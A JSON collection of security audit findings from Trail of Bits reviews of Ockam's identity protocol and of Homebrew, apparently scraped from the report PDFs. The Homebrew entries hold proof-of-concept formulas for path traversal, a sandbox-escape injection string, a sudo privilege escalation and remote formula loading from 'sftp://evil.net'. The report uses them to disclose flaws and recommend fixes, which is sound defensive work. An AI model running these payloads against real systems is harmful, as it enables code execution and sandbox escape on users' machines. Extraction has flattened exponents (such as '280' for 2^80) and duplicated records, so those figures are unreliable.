VersionedData instance, which is a serialized PurposeKeyAttestationData type, must deserialize to a ChangeData type with a public key for which the attacker knows the corresponding private key. Otherwise, the attacker will be unable to provide a proper signature for the Change block. Recommendations Short term, specify in the design that the data eld inside the VersionedData struct to be signed using identity primary keys must be unambiguous. For example, this eld could be a single enum type that contains the PurposeKeyAttestationData and ChangeData types with dierent CBOR labels. Alternatively, add an additional label to the VersionedData struct to indicate which data type it contains. Long term, ensure that all dierent types of private keys used to create digital signatures sign only a single unambiguous type (with dierent labels for each of the possible subtypes or contained types). 19 Ockam Design Review", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "3. Truncating ChangeHistory hash to 160 bits introduces risk of collisions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-ockam-designreview.pdf", "body": "The Identifier and ChangeHash types are dened as the rst 160 bits of a SHA-256 hash of the Change record inside of a ChangeHistory chain. A collision attack against SHA-256 truncated to 160 bits is possible with a time cost of approximately 280 queries using standard collision-nding techniques based on Pollards Rho method. These gures are on the upper end of feasibility but still possible to exploit. Exploit Scenario Mallory, a user with an existing Ockam Identity wants to cause disagreement about her current primary public key between dierent nodes, who are relying on the latest ChangeHash to identify the users primary public key. She uses Pollards Rho method to nd two ChangeData records with the same ChangeHash, which allows her to create two distinct ChangeHistory chains where the nal entries disagree on the primary public key but still have the same ChangeHash. Computing 280 SHA-256 hashes is within the reach of botnets today. For comparison, the Bitcoin mining network computes about 268 SHA-256 hashes per second (or about 292 per year). The equivalent amount of computational resources can cross the 280 threshold in a little over 1 hour. Once a collision is found, Mallory then selectively shares dierent Change records to dierent partitions of the network. Recommendations Short term, increase the length of the truncated SHA-256 hash from 160 bits (20 bytes) to at least 192 bits (24 bytes) for the ChangeHash. With this change, the cost of nding a collision becomes 296 rather than 280, which multiplies the time required to nd a collision by a factor of 65,536. Consequently, the collision attack is no longer practical. Long term, whenever reducing the security margin of a cryptographic primitive (e.g., truncating hashes in this case), document why this is done and why the impact on security is considered acceptable. 20 Ockam Design Review", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "4. The meanings of the primary key elds created_at and expires_at are undocumented ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-ockam-designreview.pdf", "body": "The meanings of the created_at and expires_at elds on the ChangeData type are not suciently explained by the design documentation. This may lead users to make security-critical decisions based on a awed interpretation of these elds. The ChangeData type is used to update a users primary key. The types two elds, created_at and expires_at, dene the lifetime of the new key. The Identities and Credentials section mentions that the expires_at timestamp indicates when the primary_public_key included in the change should stop being relied on as the primary public key of this identity. However, the documentation does not specify what happens if a user allows their primary key to expire without signing and broadcasting a new change. Intuitively, it is easy to assume that nodes accept changes only from live keys, so an expired key can no longer sign new changes. However, this is not described in the documentation and there is currently no check in the code performing change history validation to ensure this behavior. The meaning of the created_at eld is also not suciently explained. It is currently unclear how this eld should be validated or acted on by other nodes. In fact, the implementation explicitly allows changes where created_at is greater than expires_at. This means that the created_at eld cannot be relied on to dene an overall lifetime or validity period for the key. Exploit Scenario Alice uses Ockam to set up a network of nodes. One of the nodes is taken oine, and eventually the primary key used for the node expires. Since the key has expired, Alice believes that it is no longer sensitive and does not take proper precautions to either protect or delete the key. Mallory, a malicious user, gains access to the node and obtains the expired key. She can now create a new change based on the expired key. She broadcasts the updated change history to other nodes in the network. Since nodes do not check the expires_at eld 21 Ockam Design Review when the change history is validated, the new change is accepted as valid by other nodes, allowing Mallory to gain access to the network. Recommendations Short term, document the expected meanings of the created_at and expires_at elds, and specify how these elds should be validated. Ensure that changes signed by expired keys are rejected by all nodes. Alternatively, if the lifetime is meant to be enforced only for purpose key attestations, document this restriction and rename the two elds (e.g., to attestations_not_valid_before and attestations_not_valid_after) to make this clear. Additionally, clearly specify the full life cycle of secrets and credentials, including any applicable revocation or expiration mechanisms. Long term, ensure that the documentation always reects the proper meaning of each value specied by the protocol. In particular, if values have unintuitive or surprising meanings, they should always be documented. 22 Ockam Design Review 5. Insu\u0000cient threat model documentation Severity: Medium Diculty: Not Applicable Type: Cryptography Finding ID: TOB-OCK-5 Target: All sections", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "4. The meanings of the primary key elds created_at and expires_at are undocumented ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-ockam-designreview.pdf", "body": "The meanings of the created_at and expires_at elds on the ChangeData type are not suciently explained by the design documentation. This may lead users to make security-critical decisions based on a awed interpretation of these elds. The ChangeData type is used to update a users primary key. The types two elds, created_at and expires_at, dene the lifetime of the new key. The Identities and Credentials section mentions that the expires_at timestamp indicates when the primary_public_key included in the change should stop being relied on as the primary public key of this identity. However, the documentation does not specify what happens if a user allows their primary key to expire without signing and broadcasting a new change. Intuitively, it is easy to assume that nodes accept changes only from live keys, so an expired key can no longer sign new changes. However, this is not described in the documentation and there is currently no check in the code performing change history validation to ensure this behavior. The meaning of the created_at eld is also not suciently explained. It is currently unclear how this eld should be validated or acted on by other nodes. In fact, the implementation explicitly allows changes where created_at is greater than expires_at. This means that the created_at eld cannot be relied on to dene an overall lifetime or validity period for the key. Exploit Scenario Alice uses Ockam to set up a network of nodes. One of the nodes is taken oine, and eventually the primary key used for the node expires. Since the key has expired, Alice believes that it is no longer sensitive and does not take proper precautions to either protect or delete the key. Mallory, a malicious user, gains access to the node and obtains the expired key. She can now create a new change based on the expired key. She broadcasts the updated change history to other nodes in the network. Since nodes do not check the expires_at eld 21 Ockam Design Review when the change history is validated, the new change is accepted as valid by other nodes, allowing Mallory to gain access to the network. Recommendations Short term, document the expected meanings of the created_at and expires_at elds, and specify how these elds should be validated. Ensure that changes signed by expired keys are rejected by all nodes. Alternatively, if the lifetime is meant to be enforced only for purpose key attestations, document this restriction and rename the two elds (e.g., to attestations_not_valid_before and attestations_not_valid_after) to make this clear. Additionally, clearly specify the full life cycle of secrets and credentials, including any applicable revocation or expiration mechanisms. Long term, ensure that the documentation always reects the proper meaning of each value specied by the protocol. In particular, if values have unintuitive or surprising meanings, they should always be documented. 22 Ockam Design Review", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "5. Insu\u0000cient threat model documentation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-ockam-designreview.pdf", "body": "The threat model for Ockams protocols is not specied in the documentation. There is no description of the dierent actors in the system, the assets they value, the other actors they trust, and the security controls for achieving security goals. From the threat model, it should be clear what aspects of the assets are important, including but not limited to condentiality, integrity or authenticity, and availability. The design review included weekly discussions between auditors and developers, who provided all relevant threat modeling information for the two in-scope use cases. However, in the absence of a documented general threat model for the protocol, users and developers must make assumptions about the security goals of each component and how these goals are met in the implementation. If any of these assumptions are false, this could lead to surprising behavior and potentially real security issues when users deploy the protocol. There is no specic exploit scenario for this nding, so the diculty rating is not applicable. Recommendations Short term, add an informal threat model to each use case and section of the documentation to ensure no gaps exist. Long term, develop a formal threat model that applies to Ockams protocols. Explicitly state any assumptions that must be true for the protocol to be secure. Dene dierent types of threat actors and specify how the protocol deals with them. Once a general threat model is in place, each use case and section of the protocol needs a threat model section that describes only the ways in which they deviate from the general model for the overall protocol. 23 Ockam Design Review", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Not Applicable"]}, {"title": "6. The supported signature schemes have di\u0000erent security properties ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-ockam-designreview.pdf", "body": "Ockams supported signature schemes, EdDSA and ECDSA, oer dierent security guarantees but are used interchangeably. Although this issue is not currently exploitable, if Ockam modies the system in the future, it could become necessary to rely on additional security guarantees. The signed change history in Ockam allows an identity to rotate its primary key and attest to the validity of this change. Each rotation is associated with a Change data structure that is hashed and then signed by the current primary key and the previous primary key (if it exists). The documentation species two signing algorithms: EdDSACurve25519Signature and ECDSASHA256CurveP256Signature. The former is the preferred algorithm, as the latter algorithm is supported only due to the lack of support for EdDSA in cloud hardware security modules (HSMs). A formal modeling of the security properties of the signature scheme with CryptoVerif reveals a discrepancy between the security guarantees oered by the two schemes. In terms of security guarantees, EdDSA and ECDSA are equivalent only in that they are both believed to guarantee Existential Unforgeability under Chosen-Message Attacks (EUF-CMA). This means that an attacker who has several valid signatures on various messages will be unable to create a valid signature for a new message. However, EdDSA, as instantiated, provides additional guarantees that ECDSA does not. In particular, EdDSA provides Strong Unforgeability under Chosen-Message Attacks (SUF-CMA), so an attacker who has a number of valid signatures on various messages will be unable to create a valid new message-signature pair. ECDSA does not provide this guarantee because for any valid ECDSA signature (r,s), the signature (r,-s) is also valid. This means that an attacker could take a Change block with associated ECDSA signatures and share the same Change block with modied (but valid) signatures. When modeling change histories with CryptoVerif, only the strong unforgeability of the rst change can be proven. The issue described above does not pose a direct threat in the current deployment of Ockam in the context of the two in-scope use cases, which do not rely on strong 24 Ockam Design Review unforgeability. However, from a design perspective, it is desirable to have a clear understanding of what security guarantees are expected from dierent components, irrespective of their concrete instantiations. Furthermore, any future extension to the protocol might involve beyond unforgeability guarantees like exclusive ownership (which means that any valid signature can be created only from the private key corresponding to the public key). Fortunately, the current signing mechanism in Ockam is close to the BUFF construction, which provides beyond unforgeability security. There is no specic exploit scenario for this nding, so the diculty rating is not applicable. Recommendations Short term, consider adding a brief description of the security properties of the signed change histories and other signed data structures. Then document how the instantiations of dierent components provide the expected security guarantees. Consider all use cases of signatures in the system and whether any beyond unforgeability guarantees might be expected. If SUF-CMA security is desired, ECDSA can be modied by restricting the s component of the signature to the upper or lower half of its range. Long term, specify all the cryptographic assumptions each system component is expected to meet for the protocol to be secure. Document how each instantiation of a specic primitive meets the required assumption. 25 Ockam Design Review A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: Not Applicable"]}, {"title": "1. Path traversal during le caching ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "A path traversal when creating symlinks to cached les allows a malicious formula to create a symlink in an arbitrary location to a le with arbitrary contents during formula installation. The following code determines where to place a symlink to a cached downloaded le. def symlink_location return @symlink_location if defined?(@symlink_location) ext = Pathname(parse_basename(url)).extname @symlink_location = @cache/\"#{name}--#{version}#{ext}\" end Figure 1.1: Code to generate symlink location (brew/Library/Homebrew/download_strategy.rb:287292) However, a formulas version may contain special characters, such as dots and slashes (see also TOB-BREW-4). This allows for a path traversal. Exploit Scenario An attacker creates a pull request on homebrew-core attempting to add the following formula: # modifyBashrc.rb class Modifybashrc < Formula url \"https://example.com/files/.bashrc\" version \"/../../../../.bashrc\" end Figure 1.2: Malicious formula denition that overwrites .bashrc He then hosts a malicious .bashrc le on https://example.com/files/.bashrc. Whenever this formula is built, the malicious .bashrc le will be downloaded, and a symlink from ~/.bashrc to the downloaded le will be created. In this case, it would be fairly obvious from the package denition that it is malicious, so the maintainers would likely be able to catch it early. The attacker may be able to avoid this by setting the version surreptitiously using Ruby metaprogramming tricks, but this would be fairly dicult. Recommendations Short term, remove any special characters from the version name before using it when creating the @symlink_location path. Preferably, also disallow formulas from having these special characters in their version names in the rst place (see TOB-BREW-4). Long term, audit any uses of user-inputted strings to create paths. Ensure that the input is properly sanitized before being used.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "2. Sandbox escape via string injection ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "Homebrew creates its sandbox conguration le in a way that is vulnerable to string injection. The following are examples of lines added to the sandbox le that are vulnerable to injection. 60 69 allow_write_path \"#{Dir.home(ENV.fetch(\"USER\"))}/.cvspass\" ... allow_write_path formula.rack Figure 2.1: Vulnerable sandbox cong additions (brew/Library/Homebrew/sandbox.rb:60,69) Because formula.rack is written directly to the conguration le, a formula with a double quote in its name (which can be achieved by setting the @name variable in the initialize function) can break out of its portion of the sandbox conguration le and write its own custom rules allowing itself permissions that it should not have. Sandboxing will also break if the installing users home directory has a path with a double quote in it, or if the Homebrew Cellar has a path with a double quote in it, although these scenarios are far less likely. Exploit Scenario An attacker creates a pull request on homebrew-core attempting to add the following formula: # breakout.rb class Breakout < Formula url \"https://example.com/example-1.0.tar.gz\" def initialize(name, path, spec, alias_path: nil, tap: nil, force_bottle: false) super @name = \"\\\"))\\n(allow file-write* (subpath \\\"/\\\"))\\n(allow file-write-setugid (subpath \\\"/\\\"))\\n(allow file-read-data (subpath \\\"/dummy\" # the dummy rule at the end is needed because trailing /s get stripped end def install system \"make\", \"install\" end end Figure 2.2: Malicious formula that breaks out of its sandbox When this le is built, the following sandbox conguration le is generated (malicious portions are highlighted in red): (version 1) (debug deny) ; log all denied operations to /var/log/system.log (allow file-write* (subpath \"/private/tmp\")) (allow file-write-setugid (subpath \"/private/tmp\")) (allow file-write* (subpath \"/private/var/tmp\")) (allow file-write-setugid (subpath \"/private/var/tmp\")) (allow file-write* (regex #\"^/private/var/folders/[^/]+/[^/]+/[C,T]/\")) (allow file-write-setugid (regex #\"^/private/var/folders/[^/]+/[^/]+/[C,T]/\")) (allow file-write* (subpath \"/private/tmp\")) (allow file-write-setugid (subpath \"/private/tmp\")) (allow file-write* (subpath \"/Users/sam/Library/Caches/Homebrew\")) (allow file-write-setugid (subpath \"/Users/sam/Library/Caches/Homebrew\")) (allow file-write* (subpath \"/Users/sam/Library/Logs/Homebrew/\")) (allow file-write* (subpath \"/\")) (allow file-write-setugid (subpath \"/\")) (allow file-read-data (subpath \"/dummy\")) (allow file-write-setugid (subpath \"/Users/sam/Library/Logs/Homebrew/\")) (allow file-write* (subpath \"/\")) (allow file-write-setugid (subpath \"/\")) (allow file-read-data (subpath \"/dummy\")) (allow file-write* (subpath \"/Users/sam/.cvspass\")) (allow file-write-setugid (subpath \"/Users/sam/.cvspass\")) (allow file-write* (subpath \"/Users/sam/.fossil\")) (allow file-write-setugid (subpath \"/Users/sam/.fossil\")) (allow file-write* (subpath \"/Users/sam/.fossil-journal\")) (allow file-write-setugid (subpath \"/Users/sam/.fossil-journal\")) (allow file-write* (subpath \"/Users/sam/Library/Developer\")) (allow file-write-setugid (subpath \"/Users/sam/Library/Developer\")) (allow file-write* (subpath \"/opt/homebrew/Cellar/\")) (allow file-write* (subpath \"/\")) (allow file-write-setugid (subpath \"/\")) (allow file-read-data (subpath \"/dummy\")) (allow file-write-setugid (subpath \"/opt/homebrew/Cellar/\")) (allow file-write* (subpath \"/\")) (allow file-write-setugid (subpath \"/\")) (allow file-read-data (subpath \"/dummy\")) (allow file-write* (subpath \"/opt/homebrew/etc\")) (allow file-write-setugid (subpath \"/opt/homebrew/etc\")) (allow file-write* (subpath \"/opt/homebrew/var\")) (allow file-write-setugid (subpath \"/opt/homebrew/var\")) (allow file-write* (literal \"/dev/ptmx\") (literal \"/dev/dtracehelper\") (literal \"/dev/null\") (literal \"/dev/random\") (literal \"/dev/zero\") (regex #\"^/dev/fd/[0-9]+$\") (regex #\"^/dev/tty[a-z0-9]*$\") ) (deny file-write*) ; deny non-allowlist file write operations (allow process-exec (literal \"/bin/ps\") (with no-sandbox) ) ; allow certain processes running without sandbox (allow default) ; allow everything else Figure 2.3: Sandbox conguration le for Breakout formula (malicious lines are highlighted) Now make install is run without any sandboxing, and the attacker gains arbitrary unsandboxed code execution on the installing machine. In this case, it would be fairly obvious from the package denition that the package is malicious, so the maintainers would likely be able to catch it early. The attacker may be able to avoid this by setting the @name variable surreptitiously using Ruby metaprogramming tricks, but this would be fairly dicult. Recommendations Short term, modify allow_write_path so that it checks for special characters (quotes, newlines, etc.) in the path before adding its rules. In addition, also ensure that special characters are removed from a formulas @name before creating a formulas keg path. Preferably, also disallow formulas from having these special characters in their names in the rst place (see TOB-BREW-4). Long term, audit any uses of user-inputted strings to create paths. Ensure that the input is properly sanitized before being used.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "3. Allow default rule in sandbox conguration is overly permissive ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "Currently, the sandbox conguration for Homebrew includes the rule (allow default), which leaves some of Apples sandboxing features unused, and which allows formula build scripts to have multiple permissions that they do not need:  Build scripts have permission to send signals to processes outside of their process group. This allows them to kill processes belonging to the user.  Build scripts have permission to send network requests. Aside from allowing for le downloads without integrity checks (see TOB-BREW-8), this also allows build scripts to send requests to localhost ports. This could potentially allow for formulas to exploit vulnerable software running locally, and to access ports that are ordinarily blocked from external attackers by the rewall.  Build scripts have permission to reboot the host machine. This ability is mitigated by the fact that, typically, the user running brew install does not have permission to call reboot, meaning that the build script cannot call reboot either. Exploit Scenario An attacker contrives a formula that interacts with the local system via signals or local network requests during the build period, potentially allowing code within the sandboxed build script to pivot outside of the sandbox. Recommendations Go through Apple sandboxing documentation (third-party documentation may be necessary) and consider which operations can be blocked, banning any that are not needed for Homebrew formula builds. References  Unocial third-party documentation on Apple sandboxing: This is the best documentation we could nd on the subject.", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: Low"]}, {"title": "4. Special characters are allowed in package names and versions ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "Homebrew needlessly allows for special characters in package names and versions. While this is not directly an issue on its own, it leads to other issues such as TOB-BREW-1, TOB-BREW-2, TOB-BREW-16, and TOB-BREW-22. Disallowing special characters would make path traversal and string injection attacks much more dicult. Recommendations Short term, disallow special characters in formula names and versions. Do not put this check into the Formula class because formula denitions can overwrite Formula class methods. Instead, perform the check whenever a formula is about to be used. Long term, ensure that similar sanitization is done on any other potentially malicious values.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. Use of weak cryptographic digest in Formulary namespaces ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "Homebrew uses two dynamic namespaces to cache loaded formulae: FormulaNamespace (for formulae loaded from their Ruby denitions) and FormulaNamespaceAPI (for formulae loaded from their JSON API specications). Both of these create unique keys under their namespaces by taking the MD5 digest of a unique identier for an underlying formula (one that cannot directly be embedded in a Ruby identier). namespace = \"FormulaNamespace#{Digest::MD5.hexdigest(path.to_s)}\" Figure 5.1: Loading into FormulaNamespace with a digested identier namespace = :\"FormulaNamespaceAPI#{Digest::MD5.hexdigest(name)}\" Figure 5.2: Loading into FormulaNamespaceAPI with a digested identier MD5 is considered broken in terms of collision resistance, with collisions being computable on basic consumer hardware. Exploit Scenario An attacker contrives a malicious formula whose path (for local formulae) or name (for API formulae), when digested, collides with a legitimate formula. When both formulae are loaded, the attacker may be able to induce confusion within Homebrew about which formula is being operated on. The attackers job of nding a collision is made slightly more dicult by restrictions in their input space: they can use only characters that are valid in a formula name (for FormulaNamespaceAPI) or in a valid formula path (for FormulaNamespace). Recommendations Switch to a digest function that is considered resistant to collisions, such as SHA-256. Alternatively, develop a path or name normalization scheme that produces valid Ruby identiers, so that a hash function does not need to be used.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "6. Extraction is not sandboxed ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "Homebrew supports many dierent archive formats for source archives that should be considered untrustworthy. The unpacking process should also be run under a sandbox in order to prevent intentional or unintentional le writes outside of expected directories. # @api public def stage(&block) UnpackStrategy.detect(cached_location, prioritize_extension: true, ref_type: @ref_type, ref: @ref) .extract_nestedly(basename: basename, prioritize_extension: true, verbose: verbose? && !quiet?) chdir(&block) if block end Figure 6.1: This stage function unpacks potentially untrusted source archives without a sandbox Exploit Scenario An attacker constructs a source archive using one of the many supported formats that can induce an arbitrary le write. We analyzed a few of the common formats that have allowed this type of attack in the past (namely tar, 7z, and rar), which all now seem to mitigate this type of attack, but future unpackers or latent bugs in the existing unpackers may allow for an attacker to perform an arbitrary le write. Recommendations Short term, Homebrew should ensure that the supported unpackers protect against this type of attack. Long term, Homebrew should sandbox the unpacking process.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "7. Use of ldd on untrusted inputs ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "On Linux, Homebrew uses ldd to list the dynamic dependencies of an executable (i.e., the shared libraries that it declares as dependencies): ldd = DevelopmentTools.locate \"ldd\" ldd_output = Utils.popen_read(ldd, path.expand_path.to_s).split(\"\\n\") Figure 7.1: Using ldd to collect shared object dependencies This metadata is produced for all ELF les in a binary, as part of providing the Linux equivalent of Homebrew-on-Rubys binary relocation functionality. Running ldd can result in arbitrary code execution when a binary has a custom ELF interpreter specied. This may allow a malicious bottle to run arbitrary code outside of the context of the installing sandbox (since relocation is not sandboxed) with relative stealth (since no code is obviously executed). Exploit Scenario An attacker contrives an ELF binary with a custom .interp section, enabling arbitrary code execution. This execution occurs surreptitiously during Homebrews binary relocation phase, before the user expects any formula-provided executables to run. Recommendations Short term, Homebrew can check an ELFs interpreter (in the .interp section) before loading it with ldd and, if it appears to be a non-standard interpreter, refuse to handle it. Long term, Homebrew can replace ldd with similar inspection tools, such as readelf or objdump. Both are capable of collecting a binarys dynamic linkages without arbitrary code execution. 8. Formulas allow for external resources to be downloaded during the install step Severity: Medium Diculty: High Type: Access Controls Finding ID: TOB-BREW-8 Target: brew/Library/Homebrew/formula_installer.rb", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "9. Use of Marshal ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "The Dependency class denes _dump and _load APIs that use Rubys Marshal internally. # Define marshaling semantics because we cannot serialize @env_proc. def _dump(*) Marshal.dump([name, tags]) end def self._load(marshaled) new(*Marshal.load(marshaled)) # rubocop:disable Security/MarshalLoad end Figure 9.1: Dependency._dump and Dependency._load Marshal is a fundamentally dangerous serialization format, by design: it evaluates arbitrary Ruby objects on deserialization, allowing an attacker to easily form Marshalled inputs that run arbitrary code. After an initial analysis, was unable to determine any parts of the code where these Dependency APIs are used. However, due to Rubys dynamic nature, we are unable to state condently that they are not called indirectly somewhere in the codebase. Exploit Scenario If an attacker manages to invoke Dependency._load with a controlled payload, they may be able to execute arbitrary code surreptitiously outside of the context of an installation sandbox. Recommendations Short term, if possible, replace these uses of Marshal with a safer serialization format (such as JSON). Long term, evaluate the need for this API; if it is unneeded, remove it entirely.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Low"]}, {"title": "10. Lack of sandboxing on Linux ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "There is a lack of sandboxing at all on Linux. # typed: strict # frozen_string_literal: true require \"extend/os/mac/sandbox\" if OS.mac? Figure 10.1: Sandbox implemented only for MacOS Exploit Scenario Packages built for Linux may intentionally or unintentionally overwrite other les on the system, which can potentially allow packages to clobber each other or compromise the CI system building Linux packages, especially in the case of self-hosted Linux-based runners. Recommendations Homebrew should implement a basic Linux sandbox using either bubblewrap, nsjail, or some other lightweight, namespace-based Linux sandboxing mechanism.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "11. Sandbox escape through domain socket pivot on macOS ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "On macOS, some sandboxes may be created with special exceptions for various system and Homebrew-specic temporary directories: def allow_write_temp_and_cache allow_write_path \"/private/tmp\" allow_write_path \"/private/var/tmp\" allow_write \"^/private/var/folders/[^/]+/[^/]+/[C,T]/\", type: :regex allow_write_path HOMEBREW_TEMP allow_write_path HOMEBREW_CACHE end Figure 11.1: Sandbox exceptions for temporary directories on macOS In particular, allow_write_temp_and_cache is used in both the build and post_install phases of formula installation: sandbox = Sandbox.new formula.logs.mkpath sandbox.record_log(formula.logs/\"postinstall.sandbox.log\") sandbox.allow_write_temp_and_cache sandbox.allow_write_log(formula) Figure 11.2: Sandbox exceptions during post-install The system temporary directories excepted under these rules typically contain Unix domain sockets for running services, which in turn can be written to. Depending on the services being used, a malicious formula may be able to perform a sandbox escape by connecting to one of these domain sockets and sending service-specic information to be interpreted as system commands, instructions to perform I/O, etc. Exploit Scenario A targeted user has tmux, a popular terminal multiplexer, installed. tmux runs as a background daemon with multiple connecting clients, servicing connections through a domain socket typically exposed at /private/tmp/tmux-${UID}, where ${UID} is the running users numeric identier. Any process that can write to this domain socket can send commands to tmux, including the send-keys command, which is capable of running arbitrary shell commands. To perform a sandbox escape, an attacker discovers useful domain sockets (like tmux) in the temporary directories that the sandbox has access to. Using tmux as an example, they then send commands through the socket, causing the tmux daemon (or a subprocess of the daemon) to run arbitrary commands or perform I/O outside of the sandbox. This attack requires the target to be running an independent service or daemon that exposes a socket via a system temporary directory. However, this is a common conguration (such as with tmux by default). Recommendations Short-term, evaluate the ability of the macOS sandbox rules to further restrict Unix domain socket access in these directories. In particular, the network-outbound rule may be able to perform restrictions on unix-socket patterns. Long term, consider eliminating these paths from the sandboxed processes entirely, and instead inject TMPDIR and similar environment variables that point to an entirely Homebrew-controlled temporary directory (such as a dedicated one under HOMEBREW_TEMP).", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Medium"]}, {"title": "12. Formula privilege escalation through sudo ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "Formula denitions can run commands as the root user using sudo --non-interactive, assuming that the user has used sudo earlier in the shell history. Exploit Scenario The following gure shows an example of a malicious package that can take advantage of this issue: # privilegeEscalation.rb class Privilegeescalation < Formula url \"https://ftp.gnu.org/gnu/hello/hello-2.12.1.tar.gz\" sha256 \"8d99142afd92576f30b0cd7cb42a8dc6809998bc5d607d88761f512e26c7db20\" license \"GPL-3.0-or-later\" def install ENV.append \"LDFLAGS\", \"-liconv\" if OS.mac? system \"./configure\", \"--disable-dependency-tracking\", \"--disable-silent-rules\", \"--prefix=#{prefix}\" system \"make\", \"install\" end end system \"sudo\", \"--non-interactive\", \"touch\", \"/tmp/pwned\" Figure 12.1: Sandbox implemented only for MacOS Here is what happens when this package is installed: $ sudo do_unrelated_thing Password: ... ... $ brew install ./privilegeEscalation.rb ... $ ls -l /tmp/pwned -rw-r--r-- 1 root wheel 0 Aug 25 11:54 /tmp/pwned Figure 12.2: Installing the malicious package Recommendations Run sudo -k whenever a third-party (i.e., outside of Homebrew core) formula denition le is about to be read, and in general whenever untrusted code is about to be executed.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: High"]}, {"title": "13. Formula loading through SFTP, SCP, and other protocols ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "Homebrew allows loading of formulae by path or by file:// URL, but explicitly forbids arbitrary loading via other protocols (such as HTTP/HTTPS and FTP): def load_file(flags:, ignore_errors:) match = url.match(%r{githubusercontent.com/[\\w-]+/[\\w-]+/[a-f0-9]{40}(?:/Formula)?/(?<name>[ \\w+-.@]+).rb}) if match raise UnsupportedInstallationMethod, \"Installation of #{match[:name]} from a GitHub commit URL is unsupported! \" \\ \"`brew extract #{match[:name]}` to a stable tap on GitHub instead.\" elsif url.match?(%r{^(https?|ftp)://}) raise UnsupportedInstallationMethod, \"Non-checksummed download of #{name} formula file from an arbitrary URL is unsupported! \" \\ \"`brew extract` or `brew create` and `brew tap-new` to create a formula file in a tap \" \\ \"on GitHub instead.\" Figure 13.1: Restrictions on downloads of formulae from arbitrary URLs However, Homebrews current checks are limited to HTTP(s) and FTP, while curl (the underlying download handler) is typically built with support for additional protocols, including SFTP, SCP, IMAP, and FTPS. Consequently, an attacker is able to induce Homebrew into loading a remotely specied formula (and executing its contents) via a URL for one of these protocols: brew install sftp://evil.net/~/malicious.rb Figure 13.2: Installation from an SFTP URL Exploit Scenario An attacker may use this remote loading vector as a pivoting technique: there may be situations where Homebrew assumes that the arguments to brew install (and similar commands) all represent locally installed formulae that are trusted by the user, when in reality an attacker may be able to introduce a remote formula that gets loaded and executed unexpectedly. Recommendations We recommend that Homebrew perform formula argument sanitization through a deny-by-default strategy, i.e. rejecting anything that is not an ordinary formula name, local path, or file:// URL by default, rather than attempting to enumerate specic protocols to reject.", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "14. Sandbox allows changing permissions for important directories ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "The sandbox allows a formula build, post-install, and test step to change the permissions of the brew cache directory. class ChmodTest < Formula desc \"\" homepage \"\" url \"https://ftp.gnu.org/gnu/hello/hello-2.12.1.tar.gz\" version \"0.0.0\" sha256 \"8d99142afd92576f30b0cd7cb42a8dc6809998bc5d607d88761f512e26c7db20\" license \"MIT\" def install system \"chmod\", \"ug-w\", \"/Users/user/Library/Caches/Homebrew\" # system \"chmod\", \"777\", \"/Users/user/test_file\" # this gets blocked end test do system \"false\" end end Figure 14.1: Sample formula that changes directory permissions Exploit Scenario Given the ability to add or remove permissions in unexpected brew directories, a formula either makes les or directories too permissive or not permissive enough, thus preventing les from being read, written, created, or deleted. Recommendations Homebrew should use the sandbox to ensure that formulas do not change the permissions of unexpected les or directories, especially directories important to brew. This is governed by the file-write-mode sandbox operation. 15. Homebrew supports only end-of-life versions of Ruby Severity: Informational Diculty: Undetermined Type: Patching Finding ID: TOB-BREW-15 Target: All of Homebrew", "labels": ["Trail of Bits", "Severity: Medium", "Difficulty: Low"]}, {"title": "16. Path traversal during bottling ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf", "body": "There is a path traversal during the execution of the brew bottle command that allows for the output le to be put into a dierent directory. However, this is most likely impossible to 